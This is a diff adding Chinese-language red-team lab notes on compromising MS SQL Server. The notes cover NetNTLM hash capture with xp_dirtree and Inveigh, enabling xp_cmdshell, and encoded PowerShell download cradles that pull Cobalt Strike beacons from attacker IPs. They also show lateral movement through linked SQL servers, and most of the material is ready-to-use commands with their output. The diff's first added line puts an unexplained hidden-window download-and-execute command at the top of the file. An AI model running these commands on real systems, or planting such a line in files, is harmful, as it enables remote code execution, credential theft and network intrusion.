@@ -1,3 +1,4 @@
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
 # MS SQL Servers
 
 引入powerupsql，枚举mssql实例
@@ -189,3 +190,267 @@ runas /netonly /user:DEV\bfarmer c:\Tools\Heidisql\heidisql.exe
 
 # MS SQL NetNTLM Capture
 
+此操作要求管理员权限
+
+以管理员权限打开一个powershell（bfarmer身份）
+
+去到```//dc-2/home$```文件夹
+
+执行```powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"```
+
+拿到管理员权限
+
+
+在新的beacon下
+```
+ execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
+```
+
+在mssql server执行
+```
+EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
+```
+
+收到net NTLM哈希
+
+1660955764190.png
+
+
+等价方法，可以使用WinDivert + rportfwd的组合，参考relay那章，在kali上接受上面的net NTLM哈希
+```
+python3 /usr/local/bin/smbserver.py -smb2support pwn .
+```
+
+
+# MS SQL Command Execution
+
+在beacon执行命令
+```
+beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
+[*] Tasked beacon to import: C:\Tools\PowerUpSQL\PowerUpSQL.ps1
+[+] host called home, sent: 202908 bytes
+beacon> powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
+[*] Tasked beacon to run: Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
+[+] host called home, sent: 501 bytes
+[+] received output:
+#< CLIXML
+dev\svc_mssql
+
+```
+
+
+在Heidi执行命令,首先查看权限
+
+```
+SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
+```
+
+1660956195011.png
+
+0=没有权限，1=有权限
+
+如果上面的值是0，执行
+```
+sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
+
+现在可以执行命令
+
+1660956339358.png
+
+
+## 利用mssql执行命令的权限返回一个shell
+
+1. 因为这里mssql的流量不可以直接流向跟攻击机，因此需要做一个转发
+
+在wkstn-1
+```
+rportfwd 8080 10.10.5.120 80
+```
+
+2. 做一个pivot listener
+
+1660956769959.png
+
+配置
+
+1660956854183.png
+
+
+3. 使用上面的listener做一个攻击payload
+
+1660956941305.png
+
+
+生成payload
+```
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/w1'))"
+```
+
+把上面双引号里面的内容单独截取
+```
+IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/w1'))
+```
+
+换IP和端口,由于我们上面做了转发。10.10.5.120:80现在等于10.10.17.231:8080
+```
+IEX ((new-object net.webclient).downloadstring("http://10.10.17.231:8080/w1"))
+```
+
+使用powershell encode上面的字符串
+
+```
+PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.17.231:8080/w1"))'
+PS C:\Users\max> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA
+```
+
+4. 使用上面的加密串在msqll server执行下面的命令
+
+格式：
+```
+EXEC xp_cmdshell 'powershell -w hidden -enc <这里是加密命令>
+```
+
+```
+EXEC xp_cmdshell 'powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA';
+```
+
+收到反弹的beacon
+
+1660957434664.png
+
+
+# MS SQL Lateral Movement
+
+查看mssql的实例
+```
+SELECT * FROM master..sysservers;
+```
+
+1660957799421.png
+
+根据实例执行命令
+```
+SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
+```
+
+1660957846477.png
+
+
+查看在这个实例上是否有执行命令的能力
+```
+SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
+```
+
+1660957909630.png
+
+值=1，可以执行命令
+
+如果上面的值是0可以执行下面的命令打开
+
+```
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]
+```
+
+
+上面查询实例的等价操作
+```
+beacon> powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"
+[*] Tasked beacon to run: Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"
+[+] host called home, sent: 453 bytes
+[+] received output:
+#< CLIXML
+
+
+Version     : SQL Server 2016 
+Instance    : SRV-1
+CustomQuery : 
+Sysadmin    : 1
+Path        : {SRV-1}
+User        : DEV\bfarmer
+Links       : {SQL-1.CYBERBOTIC.IO}
+
+Version     : SQL Server 2016 
+Instance    : SQL-1
+CustomQuery : 
+Sysadmin    : 1
+Path        : {SRV-1, SQL-1.CYBERBOTIC.IO}
+User        : sa
+Links       : {SQL01.ZEROPOINTSECURITY.LOCAL}
+
+Version     : SQL Server 2019 
+Instance    : SQL01\SQLEXPRESS
+CustomQuery : 
+Sysadmin    : 1
+Path        : {SRV-1, SQL-1.CYBERBOTIC.IO, SQL01.ZEROPOINTSECURITY.LOCAL}
+User        : sa
+Links       : 
+
+
+
+```
+
+我们当前账号在3个实例上都是Sysadmin权限
+
+
+
+对sql-1.cyberbotic.io这个实例反弹回一个shell,依然使用上面的加密命令
+```
+SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA''' )
+```
+
+1660958218908.png
+
+
+
+对sql01.zeropointsecurity.local这个实例反弹回一个shell
+
+这里注意zeropointsecurity.local是不能直接跟靶机通信的
+
+在sql-1做一个转发
+```
+rportfwd 8080 10.10.17.231 8080
+```
+
+在sql-1做一个lisener
+
+1660959095996.png
+
+
+生成一句话payload
+
+1660959212159.png
+
+```
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/s1'))"
+```
+
+
+
+把上面双引号里面的内容单独截取
+```
+IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/s1'))
+```
+
+换IP和端口,由于我们上面做了转发。10.10.5.120:80现在等于10.10.17.231:8080
+```
+IEX ((new-object net.webclient).downloadstring("http://10.10.15.90:8080/s1"))
+```
+
+使用powershell encode上面的字符串
+
+```
+PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.15.90:8080/s1"))'
+PS C:\Users\max> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwAxACIAKQApAA==
+```
+
+
+
+
+
+```
+SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwAxACIAKQApAA=='''' '')' )
+```
